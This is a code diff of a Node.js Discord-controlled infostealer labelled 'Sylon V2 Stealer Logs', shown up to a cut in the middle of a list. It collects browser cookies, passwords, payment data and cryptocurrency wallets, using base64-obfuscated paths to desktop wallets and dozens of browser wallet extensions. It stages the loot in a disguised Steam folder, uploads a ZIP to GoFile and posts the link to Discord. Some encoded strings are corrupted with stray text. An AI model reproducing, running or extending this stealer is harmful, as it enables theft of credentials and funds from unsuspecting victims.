@@ -1,14 +1,5 @@
 const { exec, execSync } = require('child_process');
-if (process.platform === 'win32') {
-  try {
-    WindowsHide();
-  } catch (e) {
-    const cp = require('child_process');
-    try {
-      cp.execSync('powershell -window hidden -command ""');
-    } catch (err) {}
-  }
-}
+
 const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ChannelType, PermissionFlagsBits, EmbedBuilder, AttachmentBuilder } = require('discord.js');
 const { promisify } = require('util');
 const fs = require('fs').promises;
@@ -25,140 +16,7 @@ const si = require('systeminformation');
 const FormData = require('form-data'); // make sure it's installed
 
  
-
- 
-
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
-
- 
- 
-
- 
- 
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
- 
-
-
- 
- 
-
  
- 
-
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
- 
- 
-
-
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
 
  
  
@@ -166,49 +24,17 @@ const FormData = require('form-data'); // make sure it's installed
  
  
 
- 
- 
-
- 
- 
-
- 
- 
-
- 
- 
 
  
- 
- 
- 
 
- 
- 
  
  
 
-
-
-
-
  
  
-
 
 
 
-
- 
- 
-
- 
- 
-
- 
- 
- 
- 
 
 
 const client = new Client({
@@ -370,7 +196,6 @@ async function findBrowserDataFiles(dir) {
   }
   return results;
 }
-
 async function zipAndUploadSteamUi(guild) {
   let zipPath = null;
   let sourcePath = null;
@@ -421,14 +246,76 @@ async function zipAndUploadSteamUi(guild) {
         }
       }
     } catch {
-      // Ignore errors if browsers folder doesn't exist
     }
     
     description += `[2;32mCookies found: ${cookieCount}[0m\n`;
     description += `[2;32mPasswords found: ${passwordCount}[0m\n`;
     description += `[2;32mPayments found: ${paymentCount}[0m\n\n`;
+    const walletsPath = path.join(sourcePath, 'Wallet');
+    description += '[2;36mWallets[0m\n';
 
-    // 2. Games
+    let walletItems = [];
+    try {
+      const browserNames = ["Chrome", "Chrome Beta", "Chrome Canary", "Chromium", "Edge", "Brave", "Vivaldi", "Opera", "OperaGX", "Yandex"];
+      
+      const findWalletNames = async (dirPath) => {
+        const wallets = new Set();
+        try {
+          const entries = await fs.readdir(dirPath, { withFileTypes: true });
+          
+          for (const entry of entries) {
+            if (entry.isDirectory()) {
+              const fullPath = path.join(dirPath, entry.name);
+              
+              if (browserNames.includes(entry.name)) {
+                const ldbFolders = await findLdbFoldersRecursive(fullPath);
+                ldbFolders.forEach(folder => wallets.add(folder));
+              } else {
+                wallets.add(entry.name);
+              }
+            }
+          }
+        } catch (error) {
+        }
+        return wallets;
+      };
+      
+      const findLdbFoldersRecursive = async (dirPath) => {
+        const folders = new Set();
+        try {
+          const entries = await fs.readdir(dirPath, { withFileTypes: true });
+          
+          for (const entry of entries) {
+            const fullPath = path.join(dirPath, entry.name);
+            
+            if (entry.isDirectory()) {
+              const subFolders = await findLdbFoldersRecursive(fullPath);
+              subFolders.forEach(folder => folders.add(folder));
+            } else if (entry.isFile() && entry.name.endsWith('.ldb')) {
+              const parentFolder = path.basename(dirPath);
+              if (!['Local Storage', 'Session Storage', 'IndexedDB', 'databases'].includes(parentFolder)) {
+                folders.add(parentFolder);
+              }
+            }
+          }
+        } catch (error) {
+        }
+        return folders;
+      };
+      
+      const walletNames = await findWalletNames(walletsPath);
+      
+      if (walletNames.size > 0) {
+        walletItems = Array.from(walletNames).map(wallet => `[2;32m✅ ${wallet}[0m`);
+      } else {
+        walletItems = ['[2;31m❌ No wallets found[0m'];
+      }
+    } catch {
+      walletItems = ['[2;31m❌ No wallets found[0m'];
+    }
+
+    description += walletItems.join(' ') + '\n\n';
+    // 3. Games
     const gamesPath = path.join(sourcePath, 'Games');
     const gamesList = ['Minecraft', 'Roblox'];
     description += '[2;36mGames[0m\n';
@@ -438,7 +325,7 @@ async function zipAndUploadSteamUi(guild) {
     }).join(' ');
     description += gamesLine + '\n\n';
 
-    // 3. Launchers
+    // 4. Launchers
     const launchersPath = path.join(sourcePath, 'Launchers');
     const launchersList = ['EpicGames', 'Rockstar', 'Steam', 'Valorant'];
     description += '[2;36mLaunchers[0m\n';
@@ -448,7 +335,7 @@ async function zipAndUploadSteamUi(guild) {
     }).join(' ');
     description += launchersLine + '\n\n';
 
-    // 4. Social
+    // 5. Social
     const socialPath = path.join(sourcePath, 'Social');
     const socialList = ['Discord', 'Telegram'];
     description += '[2;36mSocial[0m\n';
@@ -467,14 +354,31 @@ async function zipAndUploadSteamUi(guild) {
     // Upload to GoFile
     const gofileUrl = await uploadToGofile(zipPath, fswithout);
 
-    // Send embed
-    const commandsChannel = guild.channels.cache.find(
-      c => c.name === 'commands' && c.type === ChannelType.GuildText
-    );
-    if (!commandsChannel) throw new Error('commands channel not found');
+    // Get Windows key for category
+    const windowsKey = await getWindowsKey();
 
+    // Find the correct category and channel
+    const category = guild.channels.cache.find(
+      c => c.name === windowsKey && c.type === ChannelType.GuildCategory
+    );
+
+    if (!category) {
+      throw new Error(`Category '${windowsKey}' not found`);
+    }
+
+    const commandsChannel = guild.channels.cache.find(
+      c => c.name === 'commands' && 
+           c.type === ChannelType.GuildText && 
+           c.parentId === category.id
+    );
+
+    if (!commandsChannel) {
+      throw new Error(`commands channel not found in category '${windowsKey}'`);
+    }
+
+    // Send embed
     const embed = new EmbedBuilder()
-      .setTitle('`\`\`\`ansi\n[2;32mSylon V2 Stealer Logs[0m\`\`\``')
+      .setTitle('Sylon V2 Stealer Logs')
       .setDescription(`\`\`\`ansi\n${description}\`\`\`\n[Download ZIP](${gofileUrl})`)
       .setColor(3553599)
       .setTimestamp();
@@ -1068,152 +972,24 @@ function handleretry(retryCount, url, filePath) {
 function deobfuscate(base64String) {
   return Buffer.from(base64String, 'base64').toString('utf8');
 }
+function copyDir(src, dest) {
+  if (!fswithout.existsSync(dest)) {
+    fswithout.mkdirSync(dest, { recursive: true });
+  }
 
-function copyWalletsToTemp() {
+  const entries = fswithout.readdirSync(src, { withFileTypes: true });
   
-  const walletPaths = {
-    "Zcash": "XEFwcERhdGFcUm9hbWluZ1xaY2FzaA==",
-    "Armory": "XEFwcERhdGFcUm9hbWluZ1xBcm1vcnk=",
-    "Bytecoin": "XEFwcERhdGFcUm9hbWluZ1xieXRlY29pbg==",
-    "Jaxx": "XEFwcERhdGFcUm9hbWluZ1xjb20ubGliZXJ0eS5qYXh4XEluZGV4ZWREQlxmaWxlX18wLmluZGV4ZWRkYi5sZXZlbGRi",
-    "Exodus": "XEFwcERhdGFcUm9hbWluZ1xFeG9kdXNcZXhvZHVzLndhbGxldA==",
-    "Ethereum": "XEFwcERhdGFcUm9hbWluZ1xFdGhlcmV1bVxrZXlzdG9yZQ==",
-    "Electrum": "XEFwcERhdGFcUm9hbWluZ1xFbGVjdHJ1bVx3YWxsZXRz",
-    "AtomicWallet": "XEFwcERhdGFcUm9hbWluZ1xhdG9taWNcTG9jYWwgU3RvcmFnZVxsZXZlbGRi",
-    "Guarda": "XEFwcERhdGFcUm9hbWluZ1xHdWFyZGFcTG9jYWwgU3RvcmFnZVxsZXZlbGRi",
-    "Coinomi": "XEFwcERhdGFcUm9hbWluZ1xDb2lub21pXENvaW5vbWlcd2fswithoutbGV0cw==",
-  };
-  let copied = 0;
-
-  for (const [name, obfuscatedPath] of Object.entries(walletPaths)) {
-    const deobfuscatedPath = deobfuscate(obfuscatedPath);
-    const source = path.join(userHome, deobfuscatedPath);
-    const dest = path.join(userHome , name);
+  for (const entry of entries) {
+    const srcPath = path.join(src, entry.name);
+    const destPath = path.join(dest, entry.name);
     
-    if (fswithout.existsSync(source)) {
-      try {
-        copyDir(source, dest);
-        copied++;
-      } catch (err) {
-      }
+    if (entry.isDirectory()) {
+      copyDir(srcPath, destPath);
     } else {
+      fswithout.copyFileSync(srcPath, destPath);
     }
   }
-
 }
-
-
-function copyBrowserWalletsToTemp() {
-  const destBase = path.join(userHome , 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Wallet');
-  
-  const browsers = {
-    "Chrome": "QXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YQ==",
-    "Chrome Beta": "QXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lIEJldGFcVXNlciBEYXRh",
-    "Chrome Canary": "QXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lIFN4U1xVc2VyIERhdGE=",
-    "Chromium": "QXBwRGF0YVxMb2NhbFxDaHJvbWl1bVxVc2VyIERhdGE=",
-    "Edge": "QXBwRGF0YVxMb2NhbFxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGE=",
-    "Brave": "QXBwRGF0YVxMb2NhbFxCcmF2ZVNvZnR3YXJlXEJyYXZlLUJyb3dzZXJcVXNlciBEYXRh",
-    "Vivaldi": "QXBwRGF0YVxMb2NhbFxWaXZhbGRpXFVzZXIgRGF0YQ==",
-    "Opera": "QXBwRGF0YVxSb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZQ==",
-    "OperaGX": "QXBwRGF0YVxSb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZQ==",
-    "Yandex": "QXBwRGF0YVxMb2NhbFxZYW5kZXhcWWFuZGV4QnJvd3NlclxVc2VyIERhdGE=",
-  };
-
-  const extensionPaths = {
-    "Authenticator": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xiaGdob2FtYXBjZHBib2hwaGlnb29vYWRkaW5wa2JhaQ==",
-    "Binance": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmaGJvaGltYWVsYm9ocGpiYmxkY25nY25hcG5kb2RqcA==",
-    "Bitapp": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmaWhrYWtmb2JrbWtqb2pwY2hwZmdjbWhmam5tbmZwaQ==",
-    "BoltX": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhb2Rra2FnbmFkY2JvYmZwZ2dmbmplb25nZW1qYmpjYQ==",
-    "Coin98": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZw==",
-    "Coinbase": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZA==",
-    "Core": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhZ29ha2ZlamphYm9tZW1wa2psZXBkZmxhbGVlb2JoYg==",
-    "Crocobit": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xwbmxmam1sY2pkamdrZGRlY2dpbmNuZGZnZWdrZWNrZQ==",
-    "Equal": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xibG5pZWlpZmZib2lsbGtuam5lcG9namhrZ25vYXBhYw==",
-    "Ever": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xjZ2Vlb2RwZmFnamNlZWZpZWZsbWRmcGhwbGtlbmxmaw==",
-    "ExodusWeb3": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhaG9scGZkaWfswithoutamdqZmhvbWloa2pibWdqaWRsY2Rubw==",
-    "Fewcha": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlYmZpZHBwbGhhYmVlZHBuaGpub2JnaG9rcGlpb29sag==",
-    "Finnie": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xjam1rbmRqaG5hZ2NmYnBpZW1ua2Rwb21jY25qYmxtag==",
-    "Guarda": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xocGdsZmhnZm5oYmdwamRlbmpnbWRnb2VpYXBwYWZsbg==",
-    "Guild": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xuYW5qbWRrbmhraW5pZm5rZ2RjZ2djZm5oZGFhbW1tag==",
-    "HarmonyOutdated": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmbm5lZ3BobG9iamRwa2hlY2Fwa2lqamRrZ2NqaGtpYg==",
-    "Iconex": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmbHBpY2lpbGVtZ2hibWZhbGljYWpvb2xoa2tlbmZlbA==",
-    "Jaxx Liberty": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xjamVsZnBscGxlYmRqamVubGxwamNibG1qa2ZjZmZuZQ==",
-    "Kaikas": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xqYmxuZGxpcGVvZ3BhZm5sZGhnbWFwYWdjY2NmY2hwaQ==",
-    "KardiaChain": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xwZGFkamtma2djYWZnYmNlaW1jcGJrYWxuZm5lcGJuaw==",
-    "Keplr": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xkbWthbWNrbm9na2djZGZoaGJkZGNnaGFjaGtlamVhcA==",
-    "Liquality": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xrcGZvcGtlbG1hcGNvaXBlbWZlbmRtZGNnaG5lZ2ltbg==",
-    "MEWCX": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xubGJtbm5pamNubGVna2pqcGNmamNsbWNmZ2dmZWZkbQ==",
-    "MaiarDEFI": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xkbmdtbGJsY29kZm9icGRwZWNhYWRnZmJjZ2dmamZubQ==",
-    "Martian": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlZmJnbGdvZm9pcHBiZ2NqZXBuaGlibGFpYmNuY2xnaw==",
-    "Math": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhZmJjYmpwYnBmYWRsa21obWNsaGtlZW9kbWFtY2ZsYw==",
-    "Metamask": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubg==",
-    "Metamask2": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlamJhbGJha29wbGNobGdoZWNkYWxtZWVlYWpuaW1obQ==",
-    "Mobox": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmY2Nra2Riam5vaWtvb2VkZWRsYXBjYWxwaW9ubWfswithoutbw==",
-    "Nami": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xscGZjYmprbmlqcGVlaWxsaWZua2lrZ25jaWtnZmhkbw==",
-    "Nifty": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xqYmRhb2NuZWlpaW5tamJqbGdhbGhjZWxnYmVqbW5pZA==",
-    "Oxygen": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmaGlsYWhlaW1nbGlnbmRka2pnb2ZrY2JnZWtoZW5iaA==",
-    "PaliWallet": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xtZ2Zma2ZiaWRpaGpwb2FvbWFqbGJnY2hkZGxpY2dwbg==",
-    "Petra": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlampsYWRpbm5ja2RnamVtZWtlYmRwZW9rYmlraGZjaQ==",
-    "Phantom": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYQ==",
-    "Pontem": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xwaGtiYW1lZmluZ2dtYWtna2xwa2xqam1naWJvaG5iYQ==",
-    "Ronin": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlYw==",
-    "Safepal": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xsZ21wY3BnbHBuZ2RvYWxiZ2VvbGRlYWpmY2xuaGFmYQ==",
-    "Saturn": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xua2RkZ25jZGpnamZjZGRhbWZnY21mbmxoY2NuaW1pZw==",
-    "Slope": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xwb2NtcGxwYWNjYW5obW5sbGJia3BnZmxpaW1qbGpnbw==",
-    "Solfare": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xiaGhobGJlcGRrYmFwYWRqZG5ub2prYmdpb2lvZGJpYw==",
-    "Sollet": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmaG1mZW5kZ2RvY21jYm1maWtkY29nb2ZwaGltbmtubw==",
-    "Starcoin": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xtZmhiZWJnb2Nsa2doZWJmZmRsZHBvYmVham1iZWNmaw==",
-    "Swash": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xjbW5kamJlY2lsYm9jamZraWJmYmlmaG5na2RtamdvZw==",
-    "TempleTezos": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xvb2tqbGJraWlqaW5ocG1uamZmY29mam9uYmZiZ2FvYw==",
-    "TerraStation": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhaWlmYm5iZm9icG1lZWtpcGhlZWlqaW1kcG5scGdwcA==",
-    "Tokenpocket": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xtZmdjY2pjaGloZmtraW5kZnBwbmFvb2VjZ2ZuZWlpaQ==",
-    "Ton": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xucGhwbHBnb2FraGhqY2hra2htaWdnYWtpam5raGZuZA==",
-    "Tron": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xpYm5lamRmam1ta3BjbmxwZWJrbG1ua29lb2lob2ZlYw==",
-    "Trust Wallet": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlZ2ppZGpicGdsaWNoZGNvbmRiY2JkbmJlZXBwZ2RwaA==",
-    "Wombat": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaA==",
-    "XDEFI": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xobWVvYm5mbmZjbWRrZGNtbGJsZ2FnbWZwZmJvaWVhZg==",
-    "XMR.PT": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlaWdibGJnamtubGZiYWprZmhvcG1jb2ppZGxnY2VobQ==",
-    "XinPay": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xib2Nwb2tpbWljY2xwYWlla2VuYWVlbGVoZGpsbG9mbw==",
-    "Yoroi": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmZm5iZWxmZG9laW9oZW5ramlibm1hZGppZWhqaGFqYg==",
-    "iWallet": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xrbmNjaGRpZ29iZ2hlbmJiYWRkb2pqbm5hb2dmcHBmag==",
-  };
-  let totalCopied = 0;
-
-  for (const [browserName, obfuscatedBrowserPath] of Object.entries(browsers)) {
-    const deobfuscatedBrowserPath = deobfuscate(obfuscatedBrowserPath);
-    const browserDataPath = path.join(userHome, deobfuscatedBrowserPath);
-    
-    if (!fswithout.existsSync(browserDataPath)) {
-      continue;
-    }
-
-    let browserCopied = 0;
-
-    const profiles = getBrowserProfiles(browserDataPath);
-    
-    for (const profile of profiles) {
-      for (const [extName, obfuscatedExtPath] of Object.entries(extensionPaths)) {
-        const deobfuscatedExtPath = deobfuscate(obfuscatedExtPath);
-        const source = path.join(profile.path, deobfuscatedExtPath);
-        const dest = path.join(destBase, browserName, profile.name, extName);
-        
-        if (fswithout.existsSync(source)) {
-          try {
-            copyDir(source, dest);
-            browserCopied++;
-            totalCopied++;
-          } catch (err) {
-          }
-        }
-      }
-    }
-    
-    if (browserCopied > 0) {
-    }
-  }
-
-}
-
 function getBrowserProfiles(browserDataPath) { // very inefficent like copydir since we already use this in other code but is what it is its a passion project
   const profiles = [];
   
@@ -1240,23 +1016,205 @@ function getBrowserProfiles(browserDataPath) { // very inefficent like copydir s
   return profiles;
 }
 
-function copyDir(src, dest) {
-  if (!fswithout.existsSync(dest)) {
-    fswithout.mkdirSync(dest, { recursive: true });
+function copyWalletsToTemp() {
+  
+  const walletPaths = {
+    "Zcash": "XEFwcERhdGFcUm9hbWluZ1xaY2FzaA==",
+    "Armory": "XEFwcERhdGFcUm9hbWluZ1xBcm1vcnk=",
+    "Bytecoin": "XEFwcERhdGFcUm9hbWluZ1xieXRlY29pbg==",
+    "Jaxx": "XEFwcERhdGFcUm9hbWluZ1xjb20ubGliZXJ0eS5qYXh4XEluZGV4ZWREQlxmaWxlX18wLmluZGV4ZWRkYi5sZXZlbGRi",
+    "Exodus": "XEFwcERhdGFcUm9hbWluZ1xFeG9kdXNcZXhvZHVzLndhbGxldA==",
+    "Ethereum": "XEFwcERhdGFcUm9hbWluZ1xFdGhlcmV1bVxrZXlzdG9yZQ==",
+    "Electrum": "XEFwcERhdGFcUm9hbWluZ1xFbGVjdHJ1bVx3YWxsZXRz",
+    "AtomicWallet": "XEFwcERhdGFcUm9hbWluZ1xhdG9taWNcTG9jYWwgU3RvcmFnZVxsZXZlbGRi",
+    "Guarda": "XEFwcERhdGFcUm9hbWluZ1xHdWFyZGFcTG9jYWwgU3RvcmFnZVxsZXZlbGRi",
+    "Coinomi": "XEFwcERhdGFcUm9hbWluZ1xDb2lub21pXENvaW5vbWlcd2fswithoutbGV0cw==",
+  };
+  const userHome = os.homedir();
+  const destBase = path.join(userHome, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Wallet');
+
+  // Ensure destination base exists
+  try {
+    fswithout.mkdirSync(destBase, { recursive: true });
+  } catch (err) {
+    console.error('Failed to create destination base directory:', destBase, err);
+    return;
   }
 
-  const entries = fswithout.readdirSync(src, { withFileTypes: true });
-  
-  for (const entry of entries) {
-    const srcPath = path.join(src, entry.name);
-    const destPath = path.join(dest, entry.name);
-    
-    if (entry.isDirectory()) {
-      copyDir(srcPath, destPath);
+  let copied = 0;
+  for (const [name, obfuscatedPath] of Object.entries(walletPaths)) {
+    let deobfuscatedPath;
+    try {
+      deobfuscatedPath = deobfuscate(obfuscatedPath);
+    } catch (err) {
+      console.warn(`[${name}] Base64 decode failed, skipping.`, err);
+      continue;
+    }
+
+    // Note: deobfuscatedPath already starts with a backslash like "\AppData\Roaming\..."
+    // We join it to the user home, normalizing separators.
+    const source = path.join(userHome, deobfuscatedPath);
+    // Destination for this wallet will be <destBase>\<WalletName>
+    const dest = path.join(destBase, name);
+
+    if (fswithout.existsSync(source)) {
+      try {
+        console.log(`Copying ${name}:`);
+        console.log(`  from: ${source}`);
+        console.log(`  to:   ${dest}`);
+        copyDir(source, dest);
+        copied++;
+      } catch (err) {
+        console.error(`Failed copying ${name} from ${source} to ${dest}:`, err);
+      }
     } else {
-      fswithout.copyFileSync(srcPath, destPath);
+      console.warn(`Source for ${name} does not exist: ${source}`);
     }
   }
+
+  console.log(`Done. Wallets copied: ${copied}`);
+}
+
+function copyBrowserWalletsToTemp() {
+  const userHome = os.homedir();
+  const destBase = path.join(userHome , 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Wallet');
+  
+  const browsers = {
+    "Chrome": "QXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YQ==",
+    "Chrome Beta": "QXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lIEJldGFcVXNlciBEYXRh",
+    "Chrome Canary": "QXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lIFN4U1xVc2VyIERhdGE=",
+    "Chromium": "QXBwRGF0YVxMb2NhbFxDaHJvbWl1bVxVc2VyIERhdGE=",
+    "Edge": "QXBwRGF0YVxMb2NhbFxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGE=",
+    "Brave": "QXBwRGF0YVxMb2NhbFxCcmF2ZVNvZnR3YXJlXEJyYXZlLUJyb3dzZXJcVXNlciBEYXRh",
+    "Vivaldi": "QXBwRGF0YVxMb2NhbFxWaXZhbGRpXFVzZXIgRGF0YQ==",
+    "Opera": "QXBwRGF0YVxSb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZQ==",
+    "OperaGX": "QXBwRGF0YVxSb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZQ==",
+    "Yandex": "QXBwRGF0YVxMb2NhbFxZYW5kZXhcWWFuZGV4QnJvd3NlclxVc2VyIERhdGE=",
+  };
+
+  const extensionPaths = {
+    "Authenticator": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xiaGdob2FtYXBjZHBib2hwaGlnb29vYWRkaW5wa2JhaQ==",
+    "Binance": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xmaGJvaGltYWVsYm9ocGpiYmxkY25nY25hcG5kb2RqcA==",
+    "Bitapp": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xmaWhrYWtmb2JrbWtqb2pwY2hwZmdjbWhmam5tbmZwaQ==",
+    "BoltX": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xhb2Rra2FnbmFkY2JvYmZwZ2dmbmplb25nZW1qYmpjYQ==",
+    "Coin98": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xhZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZw==",
+    "Coinbase": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZA==",
+    "Core": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xhZ29ha2ZlamphYm9tZW1wa2psZXBkZmxhbGVlb2JoYg==",
+    "Crocobit": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xwbmxmam1sY2pkamdrZGRlY2dpbmNuZGZnZWdrZWNrZQ==",
+    "Equal": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xibG5pZWlpZmZib2lsbGtuam5lcG9namhrZ25vYXBhYw==",
+    "Ever": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xjZ2Vlb2RwZmFnamNlZWZpZWZsbWRmcGhwbGtlbmxmaw==",
+    "ExodusWeb3": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xhaG9scGZkaWFsamdqZmhvbWloa2pibWdqaWRsY2Rubw==",
+    "Fewcha": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xlYmZpZHBwbGhhYmVlZHBuaGpub2JnaG9rcGlpb29sag==",
+    "Finnie": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xjam1rbmRqaG5hZ2NmYnBpZW1ua2Rwb21jY25qYmxtag==",
+    "Guarda": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xocGdsZmhnZm5oYmdwamRlbmpnbWRnb2VpYXBwYWZsbg==",
+    "Guild": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xuYW5qbWRrbmhraW5pZm5rZ2RjZ2djZm5oZGFhbW1tag==",
+    "HarmonyOutdated": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xmbm5lZ3BobG9iamRwa2hlY2Fwa2lqamRrZ2NqaGtpYg==",
+    "Iconex": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xmbHBpY2lpbGVtZ2hibWZhbGljYWpvb2xoa2tlbmZlbA==",
+    "Jaxx Liberty": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xjamVsZnBscGxlYmRqamVubGxwamNibG1qa2ZjZmZuZQ==",
+    "Kaikas": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xqYmxuZGxpcGVvZ3BhZm5sZGhnbWFwYWdjY2NmY2hwaQ==",
+    "KardiaChain": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xwZGFkamtma2djYWZnYmNlaW1jcGJrYWxuZm5lcGJuaw==",
+    "Keplr": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xkbWthbWNrbm9na2djZGZoaGJkZGNnaGFjaGtlamVhcA==",
+    "Liquality": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xrcGZvcGtlbG1hcGNvaXBlbWZlbmRtZGNnaG5lZ2ltbg==",
+    "MEWCX": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xubGJtbm5pamNubGVna2pqcGNmamNsbWNmZ2dmZWZkbQ==",
+    "MaiarDEFI": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xkbmdtbGJsY29kZm9icGRwZWNhYWRnZmJjZ2dmamZubQ==",
